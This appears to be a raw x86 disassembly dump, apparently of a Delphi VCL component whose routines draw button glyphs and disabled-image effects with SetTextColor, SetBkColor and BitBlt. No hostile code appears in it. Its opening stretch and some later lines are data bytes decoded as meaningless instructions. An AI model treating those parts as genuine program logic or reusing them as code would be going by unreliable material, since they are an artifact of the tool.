add [ eax ] al
add [ eax ] al
dec ebx
imul ebp [ esi + 0x64 ] 0x1
add [ edx ] cl
add [ eax ] al
add al bl
0x42
sub_42c684
jmp r-xdata
push esp
in al dx
inc edx
add [ ebp * 8 - 0x12b7ffbe ] dl
inc edx
add [ eax + 0x500042ed ] bh
out dx al
inc edx
add [ eax - 0x12 ] bl
inc edx
add [ eax - 0x12 ] ah
inc edx
add [ esi + ebp * 8 - 0x1107ffbe ] al
inc edx
add al dh
out dx eax
inc edx
add [ eax ] cl
jmp r-xdata
je r-xdata
push [ eax ]
add dh bh
jo r-xdata
outsd
outsb
jae r-xdata
add [ eax + 0x3 ] al
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000e ] al
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ edx + 0x1 ] dh
add bh bh
loopne r-xdata
add ah cl
and eax 0x3c0041
add dh bh
rcl ah 0x43
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000b ] al
add [ eax ] eax
inc eax
adc [ ecx ] al
pop edi
add [ eax ] al
add bh bh
push esp
push es
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b000f ] al
outsd
outsb
jae r-xdata
or [ ebx ] 0x0
push es
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al 0x0
or al [ ecx + 0x6c ]
insb
outsd
ja r-xdata
add [ fs : eax ] al
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0xb465646f
pop [ ebx ]
je r-xdata
inc edx
insb
insb
push ebp
jo r-xdata
add [ edi ] al
inc ebx
popad
jo r-xdata
imul ebp [ esi + 0x74 ] 0x40103c73
add [ eax + 0x1 ] ch
add bh bh
cmp ah ch
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or al [ edi + 0x72 ]
outsd
jne r-xdata
or eax 0x6e410700
arpl [ eax + 0x6f ] bp
jb r-xdata
aad 0x43
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
pop [ ebx ]
popad
add [ eax ] al
jmp [ eax + 0x3c0043d4 ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x47050016 ] al
insb
jns r-xdata
imul ebp [ edi + 0x6e ] r-xdata
push eax
add [ eax ] al
sbb al 0xec
dec ecx
outsb
js r-xdata
loop r-xdata
push r-xdata
jae r-xdata
add [ eax - 0x80000000 ] al
push ss
add [ 0x70796c47 ] al
scasd [ edi ]
inc ecx
add [ eax ] ch
add bh bh
inc eax
loop r-xdata
adc [ eax ] al
jo r-xdata
add [ eax ] dl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al [ eax ]
or dl [ eax + 0x61 ]
jb r-xdata
dec [ esp + ebp * 8 + 0x42 ]
add [ ecx ] al
add [ eax ] al
add bh bh
dec esp
in al dx
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop ss
add [ esi ] al
dec esp
popad
jns r-xdata
add [ eax - 0x1e ] dl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040015 ] al
outsd
outsb
je r-xdata
[ ebx + ebp * 8 + 0x10042 ]
add bh bh
lodsb [ esi ]
jmp r-xdata
add al 0x0
add [ eax ] al
pop ds
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009001d ] al
outsd
jo r-xdata
outsb
je r-xdata
add [ edx - 0x3f010000 ] bl
loop r-xdata
jne r-xdata
cmp al 0x10
inc eax
add [ ecx + eax ] bh
[ eax - 0x14 ]
mov eax 0xeb100041
inc edx
add [ ebx + ebp * 8 ] bl
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
add al 0x46
insb
popad
je r-xdata
pushfd
add [ eax + eax ] eax
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax [ eax ]
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
add [ eax ] dl
inc eax
add [ eax + 0x1cff0001 ] al
in al dx
add [ eax ] al
and [ edx ] 0x0
pop es
dec edi
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
sub [ ecx ] al
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax [ eax ]
arpl [ ecx + 0x6e ] bp
add [ bx + si ] dl
inc eax
add [ eax + 0x1 ] bh
add bh bh
movsb [ edi ] [ esi ]
in al dx
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and [ eax ] al
or edx [ edx + esi * 2 + 0x61 ]
sbb [ esi ] 0x0
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x7c65646f
xlat
add [ eax ] al
[ eax + 0x43 ]
jo r-xdata
push cs
push eax
popad
jb r-xdata
outsd
outsb
je r-xdata
dec ebp
outsd
jl r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax [ eax ]
push cs
push eax
popad
jb r-xdata
inc ebx
jne r-xdata
inc esp
outsd
ja r-xdata
dec ebp
outsd
jne r-xdata
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0024 ] al
outsb
popad
jb r-xdata
outsb
imul ebp [ esi + 0x74 ] r-xdata
add [ eax ] eax
jmp [ esp + ebp * 8 + 0x10042 ]
outsb
adc [ eax ] al
0xc0ff0000 0x43e2
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al 0x0
inc esp
add [ eax + eax ] bh
inc [ ecx ]
inc ebx
add [ ecx ] al
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001e ] al
push 0x6948776f
outsb
je r-xdata
outsb
je r-xdata
add [ esi + 0x300042cc ] ch
add al [ eax ]
add [ ecx - 0x6463ffbd ] ah
inc ecx
add ah ah
xor al 0x40
add al dh
xchg esp eax
inc ecx
add ah ch
xor al 0x40
add al ah
and al 0x44
je r-xdata
call 0xffffffffd8430e21
add [ eax ] al
imul esp [ ebx + 0x6b ] r-xdata
rol [ eax ] 0x1
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al 0x0
or ecx [ edi + 0x6e ]
insb
inc ebx
insb
je r-xdata
outsb
adc [ eax ] al
push edi
add [ edi ] al
push ebx
jo r-xdata
dec [ eax + 0x10042ec ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] 0x0
add [ edi ] bl
add bh bh
mov ah ch
inc edx
add [ ecx ] al
adc [ eax ] al
cdq
add [ eax ] al
[ edx - 0x1d9bffbd ]
push esp
jb r-xdata
je r-xdata
adc [ eax ] al
jne r-xdata
push 0x6948776f
outsb
je r-xdata
inc esp
add [ ebx ] dh
inc ebx
add al ah
loope r-xdata
int3
insd
add al 0x62
imul ecx [ edi + 0x4b ] 0x8
bound ebp [ ebx + 0x43 ]
popad
outsb
arpl [ ebp + 0x6c ] sp
push es
bound ebp [ ebx + 0x48 ]
insb
jo r-xdata
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
add [ eax ] al
and [ ebx ] 0x0
outsb
jae r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
inc esp
add [ edi + 0x44 ] cl
add [ eax + 0x5b ] dh
inc esp
add al bh
inc ebp
inc esp
add al ch
dec eax
inc esp
add [ eax ] al
push esp
inc ebx
add [ esp + edx * 2 ] ah
inc ebx
add [ eax + 0xa0042f1 ] bh
add [ esp + edi * 4 ] ch
sub edi [ esi + ecx + 0x13b00cb0 ]
mov al 0x14
mov al 0x3
add ch bh
call edi
add [ ebx + 0x497c0044 ] al
add [ eax ] ch
push esp
inc ebx
add [ esp + eax + 0x479c0044 ] bh
inc esp
add [ eax + 0x48 ] bl
inc esp
add [ ebx + eax * 2 + 0x44 ] dl
add [ eax + ecx * 2 ] bh
inc esp
add ah dl
or [ eax + eax + 0x68 ] eax
adc [ eax + eax + 0x7c ] al
int1
inc edx
add [ eax - 0xfffbd0f ] ch
sbb al [ eax + eax - 0x60 ]
push esi
inc ebx
add [ eax - 0x5bffbbe2 ] ah
push ds
inc esp
add [ ebp + ebx + 0x44 ] bl
add al 0x62
imul ecx [ esi + 0x6f ] 0x7
bound ebp [ ebx + 0x59 ]
jae r-xdata
loopne r-xdata
pop es
bound ebp [ ebx + 0x41 ]
bound ebp [ edi + 0x72 ]
je r-xdata
bound ebp [ ebx + 0x43 ]
insb
outsd
pop es
bound ebp [ ebx + 0x4e ]
outsd
add [ edi + ebx * 8 ] dh
inc ebx
add [ ebx + ebx * 4 - 0x6763ffbf ] dh
inc esp
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
inc eax
int1
inc edx
add [ eax - 0x57ffbbac ] al
sbb al 0x44
add [ eax ] dh
inc esp
or [ edx + 0x6b ] ah
bound ebp [ ebx + 0x52 ]
je r-xdata
inc eax
inc ecx
add [ edx + eax ] bh
add eax 0x6c416b62
insb
pop es
inc edx
jne r-xdata
inc esp
add [ esi + edx * 8 ] bl
inc ebx
add [ ecx + ecx + 0x44 ] bl
cmp al 0x2
jns r-xdata
inc ecx
add [ eax + ebx * 4 - 0x6443ffbf ] dl
inc ecx
add [ eax - 0x6bffbd10 ] dl
dec edi
inc esp
add [ eax - 0x3ffbbac ] dh
je r-xdata
outsb
outsd
jb r-xdata
bound ebp [ ebx + 0x49 ]
push ebx
inc esp
add [ eax + 0x100043d4 ] dl
dec edx
inc esp
add [ eax ] dh
dec edx
inc esp
add [ eax + 0x47 ] cl
inc esp
add al bl
rol [ ebx ] cl
fcom st3
inc ebx
add [ esp + eax ] cl
inc esp
add [ eax ] bh
add al 0x44
add [ edi + ebx * 8 ] bl
inc ebx
add [ ebp + edx * 8 + 0x43 ] dl
add [ eax + 0x200043e0 ] ch
loopne r-xdata
add [ eax + ebx * 4 - 0x676bffbf ] bl
inc ecx
add [ ebx + ebx * 4 - 0xf6fffbf ] bh
inc edx
add [ edi + ecx * 2 + 0x54b00044 ] dl
inc esp
add ah bh
outsb
jae r-xdata
inc edx
add [ ebx ] al
or edx [ edx + eax * 2 + 0x69 ]
je r-xdata
rcr [ ebx + ecx * 8 + 0x42 ] 0x0
jae r-xdata
je r-xdata
dec ecx
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ecx * 8 + 0x42 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
dec ebx
imul ebp [ esi + 0x64 ] 0x1
add [ edx ] cl
add [ eax ] al
add al bl
0x42
sub_42d070
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_42d0ee
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi ebx
and esi 0x7f
cmp [ esi * 4 + rw-data ] 0x0
jne r-xdata
mov ebx [ esi * 4 + rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d0f5
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42168c
mov [ esi * 4 + rw-data ] eax
lea eax [ ebp - 0x4 ]
mov edx [ esi * 4 + rw-data ]
call sub_4041d8
mov ecx [ ebp - 0x4 ]
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
mov edx [ rw-data ]
call sub_422074
sub_42d270
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
xor edx edx
mov eax esi
call sub_44b224
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ esi + 0x80 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_42d2c4
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
mov eax [ esi + 0x80 ]
call sub_403290
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44b278
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_42d2f4
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x80 ]
call sub_413f8c
mov esi eax
mov eax [ ebx + 0x80 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov cl 0x1
mov edx esi
mov eax [ ebx + 0x80 ]
call sub_413f48
mov eax esi
pop esi
pop ebx
retn
xor ecx ecx
xor edx edx
mov eax ebx
call sub_44b6ac
mov esi eax
lea edx [ esi + 0x1 ]
mov eax [ ebx + 0x80 ]
call sub_413ea4
sub_42d340
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_42d2f4
mov esi eax
push ebp
mov ecx edi
mov edx esi
mov eax ebx
call sub_44b8b8
inc [ ebx + 0x84 ]
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_42d36c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x80 ]
call sub_413f74
test al al
je r-xdata
pop esi
pop ebx
retn
dec [ ebx + 0x84 ]
xor ecx ecx
mov edx esi
mov eax [ ebx + 0x80 ]
call sub_413f48
sub_42d39c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403260
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax esi
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_42d3e0
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403290
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403280
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_42d410
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ esp ]
push eax
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_42d270
mov ebx eax
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_413918
mov eax [ edi + 0x4 ]
mov edx esi
call sub_413a74
mov ebx eax
cmp ebp [ ebx + 0x34 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebx + 0x30 ]
cmp eax [ esp ]
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_42d470
push ebx
mov ebx edx
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ ebx + 0x84 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ eax + 0x4 ]
call sub_413bb8
mov eax ebx
call sub_403290
sub_42d4a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_403260
mov dl 0x1
mov eax [ r-xdata ]
call sub_42168c
mov esi eax
mov [ ebx + 0x4 ] esi
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] sub_42d5d4
mov [ ebx + 0x1c ] 0x8080
mov [ ebx + 0x20 ] 0x1
xor eax eax
add esp 0xfffffff0
call sub_4035b4
xor edx edx
mov dl al
mov [ ebx + edx * 4 + 0xc ] 0xffffffff
inc eax
cmp al 0x4
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42d39c
mov [ rw-data ] eax
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_42d534
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403290
mov eax esi
call sub_42d590
cmp [ rw-data ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403280
test bl bl
jle r-xdata
mov eax [ rw-data ]
call sub_42d494
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403604
mov eax [ rw-data ]
call sub_403290
xor eax eax
mov [ rw-data ] eax
sub_42d590
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov [ esi + edi * 4 + 0xc ] 0xffffffff
inc ebx
cmp bl 0x4
jne r-xdata
mov edx eax
mov eax [ esi + 0x8 ]
call sub_42d36c
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0xc ]
cmp eax 0xffffffff
je r-xdata
mov edx [ esi + 0x8 ]
mov eax [ rw-data ]
call sub_42d470
xor eax eax
mov [ esi + 0x8 ] eax
pop edi
pop esi
pop ebx
retn
sub_42d5d4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
cmp edx esi
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_421d40
mov [ ebx + 0x1c ] eax
mov eax ebx
call sub_42d590
cmp [ ebx + 0x2a ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_42d604
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_42d590
mov edx ebx
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test eax eax
jle r-xdata
mov eax ebx
call sub_421d40
mov [ esi + 0x1c ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
pop edx
xchg edx eax
mov ecx edx
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
pop edx
xchg edx eax
mov ecx edx
cdq
idiv ecx
cmp eax 0x4
jle r-xdata
mov edx eax
mov eax esi
call sub_42d67c
mov eax 0x1
sub_42d67c
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x20 ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
jbe r-xdata
mov eax esi
call sub_42d590
mov [ esi + 0x20 ] bl
mov edx [ esi + 0x4 ]
mov eax esi
call sub_42d5d4
sub_42d6a4
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x2
jne r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov ebx [ edx + eax * 4 + 0xc ]
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x3
jae r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
or esi eax
je r-xdata
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x20 ]
mov ecx edx
cdq
idiv ecx
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov esi eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42168c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42dc53
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx edi
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx esi
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
push esi
lea eax [ ebp - 0x28 ]
push eax
mov ecx edi
xor edx edx
xor eax eax
call sub_412640
mov eax [ ebp - 0xc ]
call sub_421c54
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_41cf14
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
call sub_42141c
mov edx eax
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov bl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x20 ]
jl r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push esi
lea eax [ ebp - 0x38 ]
push eax
xor ecx ecx
mov cl bl
inc ecx
imul ecx edi
xor eax eax
mov al bl
imul edi
xor edx edx
call sub_412640
mov al [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
xor ebx ebx
mov ecx esi
mov edx edi
mov eax [ rw-data ]
call sub_42d410
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42d39c
mov [ rw-data ] eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_421c54
push eax
mov eax [ ebp - 0xc ]
call sub_421c54
lea edx [ ebp - 0x28 ]
pop ecx
call sub_41d184
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x38 ] 0x1
jne r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov ecx 0x20000000
mov edx [ ebp - 0xc ]
call sub_42d340
xor edx edx
mov dl [ ebp - 0x5 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + edx * 4 + 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_42d340
xor edx edx
mov dl [ ebp - 0x5 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + edx * 4 + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_42dc17
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_42168c
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42168c
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
jbe r-xdata
dec eax
sub al 0x2
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403290
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x14 ]
call sub_421c54
mov eax [ eax + 0x14 ]
xor edx edx
call sub_41cf14
mov edx edi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x14 ]
call sub_421d10
test al al
je r-xdata
mov eax [ ebp - 0xc ]
call sub_421c54
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_421c54
mov ecx eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_41d184
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_422a24
mov edx edi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x10 ]
call sub_421c54
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_41cf14
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_421c54
push eax
mov eax [ ebp - 0x14 ]
call sub_421c54
lea edx [ ebp - 0x28 ]
pop ecx
call sub_41d184
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x14 ]
mov edx 0xff000014
call sub_41cf14
mov eax [ ebp - 0x18 ]
call sub_41d780
mov ebx eax
push 0x0
push ebx
call SetTextColor
push 0xffffff
push ebx
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_421c54
call sub_41d780
push eax
push esi
push edi
push 0x0
push 0x0
push ebx
call BitBlt
mov eax [ ebp - 0x10 ]
call sub_421c54
mov eax [ eax + 0x14 ]
mov edx 0x808080
call sub_41cf14
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_421c54
push eax
mov eax [ ebp - 0x14 ]
call sub_421c54
lea edx [ ebp - 0x28 ]
pop ecx
call sub_41d184
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x14 ]
mov edx 0xff000010
call sub_41cf14
mov eax [ ebp - 0x18 ]
call sub_41d780
mov ebx eax
push 0x0
push ebx
call SetTextColor
push 0xffffff
push ebx
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_421c54
call sub_41d780
push eax
push esi
push edi
push 0x0
push 0x0
push ebx
call BitBlt
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_41c268
push eax
mov eax [ ebp - 0x10 ]
call sub_421c54
mov eax [ eax + 0x14 ]
pop edx
call sub_41cf14
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_421c54
push eax
mov eax [ ebp - 0x14 ]
call sub_421c54
lea edx [ ebp - 0x28 ]
pop ecx
call sub_41d184
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_41cf14
mov eax [ ebp - 0x18 ]
call sub_41d780
mov ebx eax
push 0x0
push ebx
call SetTextColor
push 0xffffff
push ebx
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_421c54
call sub_41d780
push eax
push esi
push edi
push 0x0
push 0x0
push ebx
call BitBlt
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_422a24
mov eax [ ebp - 0xc ]
call sub_421c54
mov ebx eax
mov eax [ ebx + 0x14 ]
mov edx 0xff00000f
call sub_41cf14
lea edx [ ebp - 0x28 ]
mov eax ebx
call sub_41d2ec
mov eax [ ebx + 0x14 ]
mov edx 0xff000014
call sub_41cf14
push 0x0
mov eax ebx
call sub_41d780
push eax
call SetTextColor
push 0xffffff
mov eax ebx
call sub_41d780
push eax
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_421c54
call sub_41d780
push eax
push esi
push edi
push 0x1
push 0x1
mov eax ebx
call sub_41d780
push eax
call BitBlt
mov eax [ ebx + 0x14 ]
mov edx 0xff000010
call sub_41cf14
push 0x0
mov eax ebx
call sub_41d780
push eax
call SetTextColor
push 0xffffff
mov eax ebx
call sub_41d780
push eax
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_421c54
call sub_41d780
push eax
push esi
push edi
push 0x0
push 0x0
mov eax ebx
call sub_41d780
push eax
call BitBlt
mov eax [ ebp - 0x14 ]
call sub_421c54
mov eax [ eax + 0xc ]
mov edx 0xffffff
call sub_41c728
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_422a24
mov eax [ ebp - 0x14 ]
call sub_421c54
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_41cf14
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403290
mov eax [ ebp - 0x14 ]
call sub_403290
retn
sub_42dc7c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
